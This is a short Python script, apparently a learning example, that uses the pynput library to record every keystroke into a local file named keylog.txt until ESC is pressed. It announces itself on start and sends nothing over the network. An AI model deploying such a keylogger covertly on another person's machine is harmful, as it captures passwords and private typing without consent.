from pynput import keyboard # type: ignore

# File to store the logged keystrokes
log_file = "keylog.txt"

def on_press(key):
    """
    key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was pressed.
    """
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Special keys (e.g., shift, ctrl) have no 'char' attribute
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when the escape key is released
        return False

def main():
    print("Starting keylogger. Press ESC to stop.")
    
    # Set up the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
